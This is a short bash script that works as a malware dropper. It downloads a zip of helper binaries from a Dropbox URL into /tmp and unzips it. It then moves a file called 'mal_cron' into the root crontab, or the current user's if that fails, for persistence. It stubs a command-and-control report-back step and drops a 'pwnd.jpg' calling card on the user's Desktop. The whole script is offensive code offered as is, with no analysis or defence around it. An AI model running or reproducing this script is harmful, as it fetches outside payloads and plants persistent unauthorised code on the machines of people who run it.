#!/usr/bin/env bash
CURR_USR=$(whoami)
# Step 1: Download assisting binaries
ZIP_URL="https://uc678aaf33e0ee4c61d4b68281f2.dl.dropboxusercontent.com/cd/0/get/Av0uZ3NfPko55_1m7sssnW8ZvF5aj-HrSCEa38PndOrMwWKqahMVMcaWagxDiwQywBWtJQifoTual9X8rOdSzTndNEB881PmsDXsqoEpo9GYxlZC9X25FqoJ7Kamyj4TcWs/file"
$(curl $ZIP_URL --output /tmp/helpers.zip --silent)
echo "File Successfully downloaded"
# Step 2: Move to dir, unzip
cd /tmp
echo "Current working directory: `pwd`"
$(unzip -oq ./helpers.zip)
# Step 3: Determine crontab directory
if [[ -d "/var/spool/cron/crontabs/" ]]; then
  CRON_DIR="/var/spool/cron/crontabs/"
elif [[ -d "/etc/cron.d/" ]]; then
  CRON_DIR="/etc/cron.d/"
else
  CRON_DIR="No cron"
fi
# Step 4: Add cron file
echo "Cron directory: $CRON_DIR"
if [[ $CRON_DIR != "No cron" ]]; then
  {
    # Attempt to create root cron file
    mv -f ./mal_cron $CRON_DIR"root"
  } || {
    # If failed, create as current user
    mv -f ./mal_cron $CRON_DIR$CURR_USR
  }
fi
# Step 4: Report back to C2 (TBI)

# Step 5: Leave calling card :)
$(curl https://vignette.wikia.nocookie.net/warhammer40k/images/e/e7/Genestealer_Cultists_rise.jpg/ --output "home/$CURR_USR/Desktop/pwnd.jpg" --silent)
